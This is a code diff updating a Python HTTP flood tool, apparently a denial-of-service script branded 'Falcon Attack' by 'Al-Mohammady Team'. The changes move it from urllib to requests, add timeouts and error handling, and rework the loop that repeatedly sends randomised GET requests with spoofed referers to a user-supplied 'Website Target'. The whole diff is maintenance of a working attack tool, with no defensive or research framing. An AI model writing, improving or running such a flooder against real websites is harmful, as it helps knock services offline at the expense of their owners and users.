@@ -1,8 +1,9 @@
-import urllib.request
+import requests
 import concurrent.futures
 import random
 import re
-import sys, os
+import sys
+import os
 from colorama import Fore
 import threading
 import string
@@ -20,9 +21,10 @@ headers_referers = []
 request_counter = 0
 flag = 0
 safe = 0
-__version__ = '8.0'
+__version__ = '8.6'
 __author__ = "Al-Mohammady Team."
 __method__ = 'HTTP'
+
 
 def inc_counter():
     global request_counter
@@ -36,7 +38,10 @@ def set_safe():
     global safe
     safe = 1
 
-# Generates a referer array
+
+# Read data from file
+
+# generates a referer array
 def referer_list():
     global headers_referers
     with open('Tools/referers.txt', 'r') as file:
@@ -45,7 +50,7 @@ def referer_list():
 
     return headers_referers
 
-# Builds random ASCII string
+# builds random ASCII string
 def buildblock(size):
     return ''.join(random.choice(string.ascii_uppercase) for _ in range(size))
 
@@ -55,7 +60,7 @@ def usage():
     spinner.stop()
     print('-'*40)
 
-# HTTP request function
+# http request using requests
 def httpcall(url):
     code = 0
     if url.count("?") > 0:
@@ -77,26 +82,27 @@ def httpcall(url):
     }
 
     try:
-        urllib.request.urlopen(urllib.request.Request(request_url, headers=headers))
-    except urllib.error.HTTPError as e:
+        response = requests.get(request_url, headers=headers, timeout=10)
+        response.raise_for_status()  # raise an exception for bad responses (e.g. 500)
+    except requests.exceptions.HTTPError as e:
         set_flag(1)
         print(f"{Fore.RED}[ 500 ] {Fore.MAGENTA} Response Code !")
         code = 500
-    except urllib.error.URLError as e:
-        sys.exit()
+    except requests.exceptions.RequestException as e:
+        sys.exit(f"Request failed: {e}")
     else:
         inc_counter()
 
     return code
 
-# HTTP caller function
+# http caller function
 def http_caller(url):
-    while True:  # This will ensure continuous attacks
+    while flag < 2:
         code = httpcall(url)
         if code == 500 and safe == 1:
             pass
 
-# Monitors http threads and counts requests
+# monitors http threads and counts requests
 def monitor_thread():
     sent = 0
     previous = request_counter
@@ -108,12 +114,12 @@ def monitor_thread():
     if flag == 2:
         print(f"\n{Fore.RED}-- Falcon Attack Finish --{Fore.RESET}")
 
-# Execute the attack
+# execute
 if __name__ == "__main__":
     os.system('clear')
     logo()
     usage()
-
+    
     url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target  : ")
 
     if url.count("/") == 2:
